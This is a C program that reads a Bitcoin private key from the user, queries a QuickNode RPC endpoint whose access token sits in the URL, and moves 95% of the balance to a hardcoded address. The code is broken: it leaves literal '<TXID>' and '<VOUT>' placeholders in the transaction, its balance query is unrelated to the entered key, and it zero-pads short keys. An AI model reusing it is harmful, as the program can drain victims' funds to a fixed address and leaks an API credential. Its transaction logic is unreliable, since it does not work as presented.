#include <stdio.h>
#include <curl/curl.h>
#include <string.h>
#include <stdlib.h>
#include <json-c/json.h>

#define RPC_URL "https://radial-alpha-putty.btc.quiknode.pro/95ab8ad003e59cd2ad2947b0e91a4cb79a666f39" // QuickNode URL
#define MY_ADDRESS "3989LYRH3bauPigYs8HSTAg8kGGNHtvgjF" // Replace with your destination address
#define PERCENTAGE 0.95

struct Response {
    char *data;
    size_t size;
};

static size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    struct Response *resp = (struct Response *)userp;
    char *ptr = realloc(resp->data, resp->size + realsize + 1);
    resp->data = ptr;
    memcpy(&(resp->data[resp->size]), contents, realsize);
    resp->size += realsize;
    resp->data[resp->size] = 0;
    return realsize;
}

double get_balance(CURL *curl) {
    struct Response resp = {0};
    struct curl_slist *headers = curl_slist_append(NULL, "Content-Type: application/json");

    char json[512] = "{\"jsonrpc\":\"1.0\",\"id\":\"getbalance\",\"method\":\"listunspent\",\"params\":[]}";

    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&resp);

    curl_easy_perform(curl);

    struct json_object *parsed_json = json_tokener_parse(resp.data);
    struct json_object *result;
    json_object_object_get_ex(parsed_json, "result", &result);

    double balance = 0.0;
    if (result) {
        int array_len = json_object_array_length(result);
        for (int i = 0; i < array_len; i++) {
            struct json_object *utxo = json_object_array_get_idx(result, i);
            struct json_object *amount;
            json_object_object_get_ex(utxo, "amount", &amount);
            balance += json_object_get_double(amount);
        }
    }

    free(resp.data);
    curl_slist_free_all(headers);
    json_object_put(parsed_json);

    return balance;
}

void make_transfer(CURL *curl, const char *amount, const char *private_key) {
    struct Response resp = {0};
    struct curl_slist *headers = curl_slist_append(NULL, "Content-Type: application/json");

    // Step 1: Create raw transaction
    char create_tx_json[1024];
    snprintf(create_tx_json, sizeof(create_tx_json),
             "{\"jsonrpc\":\"1.0\",\"id\":\"createtx\",\"method\":\"createrawtransaction\",\"params\":[[{\"txid\":\"<TXID>\",\"vout\":<VOUT>}],{\"%s\":%s}]}",
             MY_ADDRESS, amount);

    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, create_tx_json);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&resp);

    CURLcode res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        fprintf(stderr, "Failed to create raw transaction: %s\n", curl_easy_strerror(res));
        return;
    }

    struct json_object *parsed_json = json_tokener_parse(resp.data);
    struct json_object *result;
    json_object_object_get_ex(parsed_json, "result", &result);

    if (!result) {
        fprintf(stderr, "Error: Unable to create raw transaction. Response: %s\n", resp.data);
        free(resp.data);
        return;
    }

    const char *raw_tx = json_object_get_string(result);
    free(resp.data);
    resp.data = NULL;

    // Step 2: Sign raw transaction
    char sign_tx_json[1024];
    snprintf(sign_tx_json, sizeof(sign_tx_json),
             "{\"jsonrpc\":\"1.0\",\"id\":\"signtx\",\"method\":\"signrawtransactionwithkey\",\"params\":[\"%s\",[\"%s\"]]}",
             raw_tx, private_key);

    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, sign_tx_json);
    res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        fprintf(stderr, "Failed to sign transaction: %s\n", curl_easy_strerror(res));
        return;
    }

    parsed_json = json_tokener_parse(resp.data);
    json_object_object_get_ex(parsed_json, "result", &result);

    if (!result) {
        fprintf(stderr, "Error: Unable to sign transaction. Response: %s\n", resp.data);
        free(resp.data);
        return;
    }

    struct json_object *hex;
    json_object_object_get_ex(result, "hex", &hex);
    const char *signed_tx = json_object_get_string(hex);
    free(resp.data);
    resp.data = NULL;

    // Step 3: Send raw transaction
    char send_tx_json[512];
    snprintf(send_tx_json, sizeof(send_tx_json),
             "{\"jsonrpc\":\"1.0\",\"id\":\"sendtx\",\"method\":\"sendrawtransaction\",\"params\":[\"%s\"]}",
             signed_tx);

    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, send_tx_json);
    res = curl_easy_perform(curl);
    if (res == CURLE_OK) {
        printf("Transaction sent successfully: %s\n", resp.data);
    } else {
        fprintf(stderr, "Failed to send transaction: %s\n", curl_easy_strerror(res));
    }

    free(resp.data);
    curl_slist_free_all(headers);
}

int main() {
    CURL *curl;
    char private_key[100];

    printf("Enter private key: ");
    fgets(private_key, sizeof(private_key), stdin);
    private_key[strcspn(private_key, "\n")] = 0;

    // Preprocess private key to handle different formats
    if (strncmp(private_key, "0x", 2) == 0 || strncmp(private_key, "0X", 2) == 0) {
        memmove(private_key, private_key + 2, strlen(private_key) - 1);
    }

    // Pad short private keys to 64 characters
    int len = strlen(private_key);
    if (len < 64) {
        char padded_key[65] = {0};
        memset(padded_key, '0', 64 - len);
        strcat(padded_key, private_key);
        strcpy(private_key, padded_key);
    }

    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, RPC_URL);

        double balance = get_balance(curl);
        printf("Current balance: %.8f BTC\n", balance);

        if (balance == 0.0) {
            printf("Insufficient balance. Transaction cannot proceed.\n");
            curl_easy_cleanup(curl);
            return 0;
        }

        char amount[20];
        snprintf(amount, sizeof(amount), "%.8f", balance * PERCENTAGE);
        make_transfer(curl, amount, private_key);

        curl_easy_cleanup(curl);
    }
    return 0;
}
